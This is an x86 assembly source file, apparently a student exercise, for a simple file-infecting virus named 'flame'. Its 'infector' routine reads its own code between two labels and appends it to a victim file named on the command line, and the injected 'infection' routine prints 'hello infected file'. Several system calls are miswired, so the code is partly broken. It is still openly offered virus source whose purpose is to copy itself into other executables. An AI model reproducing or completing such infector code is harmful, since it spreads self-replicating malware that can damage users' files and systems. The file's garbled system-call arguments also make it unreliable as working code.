section .rodata
    message: db 'hello infected file',0xa
    msgLength: equ $-message
    exeName: db 'flame',0x0
    exeNameLength: equ $-exeName

section .bss
    buffer: resb 10000

section .data
    flameDir: dd 0
    victimDir: dd 0
    numBytes: dd 0
    victimName: dd 0
    length: dd 0



section .text
global _start
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    ;so argv[1] should be at the sp+8
    ;mov eax, [esp+8]
    ;mov dword [victimName],eax
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )
    push dword [victimName] ;push arg for 
    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

    infection:
        push    ebp             ; Save caller state
        mov     ebp, esp
        sub     esp, 4          ; Leave space for local var on stack
        pushad                  ; Save some more caller state

        mov edx, length     ;edx = message length
        mov ecx, message  ;ecx = message
        mov ebx, 1          ;ebx = stdout
        mov eax, 4          ;eax = sys_write op code
        int 0x80            ;call the kernel
        ;exit
        mov ebx, 0          ;ebx = exit code 0
        mov eax, 1          ;eax = sys_exit op code
        int 0x80            ;call the kernal

        popad                   ; Restore caller state (registers)
        mov     eax, [ebp-4]    ; place returned value where caller can see it
        add     esp, 4          ; Restore caller state
        pop     ebp             ; Restore caller state
        ret                     ; Back to caller

    infector:
        push    ebp             ; Save caller state
        mov     ebp, esp
        sub     esp, 4          ; Leave space for local var on stack
        pushad                  ; Save some more caller state

        mov eax, [ebp+8]    ;1st (only) arg is the victim file name
        mov [victimName], eax    
        mov dword [numBytes],code_end
        sub dword [numBytes], code_start ;numbytes = code_end - code_start

        ;open executable for reading
        mov edx, 0          ;edx = 0, doesnt matter though
        mov ecx, 0          ;ecx = read only op code
        mov ebx, exeName    ;ebx = "flame"
        mov eax, 5          ;eax = sys_open op code
        int 0x80            ;call the kernel to open flame for reading

        mov dword [flameDir], eax   ;flameDir = return value = flame dirent int

        ;seek for the spot in executable to start read
        mov edx, 0          ;edx = seek_set op code
        mov ecx, code_start ;ecx = seek offset = code_start label
        mov ebx, flameDir   ;ebx = flame dirent 
        mov eax, 19         ;eax = sys_seek op code
        int 0x80            ;call the kernel to seek


        ;read relavent byte code to buffer
        mov edx, numBytes   ;edx = numBytes
        mov ecx, buffer     ;ecx = buffer
        mov ebx, flameDir   ;ebx = flame dirent
        mov eax, 3          ;eax = sys_read op code
        int 0x80            ;call the kernel to read numBytes to buffer


        ;open victim file for appending
        mov edx, 0          ;edx = 0, doesnt matter though
        mov ecx, 1024       ;ecx = append only op code
        mov ebx, victimName ;ebx = "flame"
        mov eax, 5          ;eax = sys_open op code
        int 0x80            ;call the kernel to open victime File for appending

        mov dword [victimDir], eax   ;victimDir = return value = victim dirent int


        ;write buffer to relavent file
        mov edx, numBytes  ;edx = numBytes
        mov ecx, buffer     ;ecx = buffer
        mov ebx, victimDir     ;ebx = victim dirent
        mov eax, 3          ;eax = sys_write op code
        int 0x80            ;call the kernel to write numBytes to victim

        ;close files
        mov ebx, flameDir   ;ebx = flame dirent
        mov eax, 6          ;eax = sys_close op code
        int 0x80            ;call the kernel to close flameDir
        mov ebx, victimDir  ;ebx = flame dirent
        mov eax, 6          ;eax = sys_close op code
        int 0x80            ;call the kernel to close victimDir

        ;exit??? just copied from start
        popad                   ; Restore caller state (registers)
        mov     eax, [ebp-4]    ; place returned value where caller can see it
        add     esp, 4          ; Restore caller state
        pop     ebp             ; Restore caller state
        ret                     ; Back to caller
        code_end:

